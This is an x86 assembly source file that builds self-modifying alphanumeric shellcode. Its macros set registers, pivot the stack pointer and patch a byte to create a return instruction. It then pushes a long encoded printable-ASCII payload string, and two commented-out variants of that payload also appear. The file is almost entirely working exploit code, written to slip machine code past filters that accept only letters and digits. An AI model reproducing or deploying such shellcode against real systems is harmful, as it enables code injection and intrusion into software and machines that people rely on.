.macro pmov src, dst
       push \src
       popl \dst
.endm
# Length: 2 bytes (6 when src = <imm32>)

.macro zero_eax
       pmov $0x41414141, %eax
       xorl  $0x41414141, %eax
.endm

.macro set_regs eax=%eax, ecx=%ecx, edx=%edx, ebx=%ebx, ebp=%ebp, esi=%esi, edi=%edi, buried=%eax
	push \eax
	push \ecx
	push \edx
	push \ebx
	push \buried		# there is no 'popl %esp' in popa
	push \ebp
	push \esi
	push \edi
	popa
.endm
# Length: #imm8 + 4 * #imm32 + 9 bytes

.macro nopnop
       incl %edi
       decl %edi
.endm

.macro rep_add n, reg
.if \n < 0
	dec \reg
	rep_add "(\n + 1)", \reg
.endif
.if \n > 0
	inc \reg
	rep_add "(\n - 1)", \reg
.endif
.endm

.macro pop_eip reg
	rep_add -4, %esp
	popl \reg
.endm

.macro init_regs
	pop_eip %ecx			# %ecx ~ %eip
	zero_eax
	decl %eax
	pmov %eax, %edx			# %edx = -1
	xorb $0x33, %al			# %eax = -0x34
	set_regs eax=%edx, ebx=%edx, ecx=%edx, edx=%eax, esi=%eax, edi=%eax, ebp=%ecx
	incl %ebx
	rep_add 3, %edx			# %edx = -0x31 = -1 ^ 0x30
.endm
# %eax = -1
# %ebx =  0
# %ecx = -1
# %edx = -1 ^ 0x30 = 0xffffffcd
# %esi = -0x34
# %edi = -0x34
# %ebp ~ %eip

# With %esi = -0x34:
.macro popl_esp aux_reg=%eax
	pmov %esp, \aux_reg    # aux_reg := %esp
	xorl 0x34(%esp, %esi), \aux_reg   # aux_reg := X ^ %esp
	pushl \aux_reg
	popl \aux_reg
	xorl 0x30(%esp, %esi), %esp       # %esp := aux_reg ^ %esp = X
.endm
# Length: 15 bytes

.set HUNDREDS, 1
.set OFFSET, 0x31
.set EDX, 0x71

.macro set_edx
	push $EDX
.if HUNDREDS > 0
	incl %esp
	popl %edx
	rep_add HUNDREDS, %edx
	pushl %edx
	decl %esp
.endif
	popl %edx
.endm

.macro push_shellcode
	.ascii "QX5Z0ZZ5hO55PQX5OdOa59x9OPhaZZZX5N834PhaKZZX5N822Ph0kZa0T44X5f92NPhZ0020T450T46X5ZezZ51Z5cPfQfheyX5oZZ055bhOPfQfh0Z0T44X50Zez5O1Z5Ph0ey00T440T47X5OZ82Ph00Z00T440T450T47X5Z0Ze5hO1ZPh0eZ00T440T47X5OZk6Ph00Z00T440T450T47X5OdZe59X1ZPQX5OdZ059zhOPh1ookX54889Ph00W00T440T450T47X5azZz5E5k6Ph0Z0Z0T440T46X50ZeZ5O1Z1PfQfhk00T45X5ZOdZ5c9zhPhW01o0T45X51L58PfQfh0Z0T44X5eZaz5Z1E5Ph000Z0T440T450T46X5dZ0Z5zhO1Phaik00T47X5q89vPh100Z0T450T46X5ZOdZ5i9zjPha0WZ0T45X5qm10Ph1oWZX53812Ph00W00T440T450T47X5azZz5E5k6Ph0Z0Z0T440T46X50ZeZ5O1Z1PfQfhk00T45X5ZOdZ5c9zhPhZ1Z1X50300Ph6Z1mX58059Ph00W00T440T450T47X5azZz5E5k6Ph0Z0Z0T440T46X5dZeZ5Y1Z1PQX5dZ0O5zhO9Ph1Z100T47X5003vPh01oZ0T44X5L080PhZ00W0T450T46X5ZazZ51E5kPhZ0Z00T450T47X5Z1Ze5111ZP"
#	.ascii "haKZ00T47X5N82oPhaZZZX5N834PQX5411158111PfQfh100T45X5ZZ0a5lhOvPh010k0T440T46X5dZOZ5z08bPhk0100T450T47X5ZaZO5cuc9PhZ2o00T47X5097fP"
.endm

.macro BP
#	.byte 0xcc
.endm

.set SHIFT, 2
.text
.globl _start
_start:
	init_regs
	pushl %esp
.if SHIFT != 0
	incl %esp
	popl %ecx
	rep_add SHIFT, %ecx
	pushl %ecx
	decl %esp
.endif
	popl_esp aux_reg=%ecx
	pmov %eax, %ecx
#	.ascii "haKZ00T47X5N82oPhaZZZX5N834PQX5411158111PfQfh100T45X5ZZ0a5lhOvPh010k0T440T46X5dZOZ5z08bPhk0100T450T47X5ZaZO5cuc9PhZ2o00T47X5097fPTjJZQX4d0DU0X"
	push_shellcode
	push %esp
	set_edx
	pmov %ecx, %eax
	xorb $0x64, %al
	xorb %al, OFFSET(%ebp, %edx, 2)
	.byte 0x58			# ret

